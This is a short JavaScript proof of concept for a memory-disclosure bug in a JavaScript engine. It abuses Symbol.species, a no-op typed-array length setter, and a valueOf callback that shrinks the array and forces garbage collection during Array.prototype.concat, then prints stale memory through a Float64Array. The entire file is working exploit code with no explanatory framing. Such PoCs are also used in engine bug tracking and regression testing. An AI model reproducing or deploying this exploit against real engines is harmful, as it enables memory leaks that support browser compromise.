function gc() {
	for (var i = 0; i < 64; i++) {
		new ArrayBuffer(0x100000);
	}
}

class Leaky extends Float64Array {}

let u32 = new Leaky(1000);
u32.__defineSetter__('length', function() {});

class MyArray extends Array {
    static get [Symbol.species]() {
        return function() { return u32; }
    }; 
}

var w = new MyArray(300);
w.fill(1.1);
delete w[1];
Array.prototype[1] = {
	valueOf: function() {
	    w.length = 1;
	    gc();
	    delete Array.prototype[1];
	    return 1.1; 
	}
};

var c = Array.prototype.concat.call(w);

for (var i = 0; i < 32; i++) {
	print(u32[i]);
}
